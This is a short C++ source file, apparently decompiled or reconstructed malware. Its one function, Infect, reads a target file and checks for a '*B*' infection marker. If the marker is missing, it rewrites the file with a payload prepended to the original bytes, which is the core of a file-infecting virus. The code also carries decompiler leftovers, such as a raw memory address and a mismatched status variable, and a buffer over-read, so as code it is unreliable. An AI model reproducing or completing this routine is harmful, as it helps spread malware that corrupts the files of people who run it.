#include "data_globals.h"
#include <fstream>
#include <cstring>
#include <cstdlib>

void Infect(char* filename, char* payload)
{
    std::ifstream in_file(filename, std::ios::in | std::ios::binary);
    in_file.seekg(0, std::ios::end);
    std::streampos pos = in_file.tellg();
    int file_size = static_cast<int>(pos);
    in_file.seekg(0, std::ios::beg);

    Buffer = static_cast<char*>(malloc(static_cast<size_t>(file_size)));
    in_file.read(Buffer, static_cast<std::streamsize>(file_size));
    in_file.close();

    for (int j = 0; j < file_size; ++j) {
        if (Buffer[j] == '*' && Buffer[j + 1] == 'B' && Buffer[j + 2] == '*') {
            _Status = 0x534559;
            break;
        }
    }

    if (strcmp(Status, "YES") != 0) {
        std::ofstream out_file(filename, std::ios::out | std::ios::binary);
        out_file << payload;
        strlen(&inf);  // side effect – keep as is
        out_file << reinterpret_cast<const char*>(0x140008164);
        out_file.write(Buffer, static_cast<std::streamsize>(file_size));
        out_file.close();
    }

    free(Buffer);
}
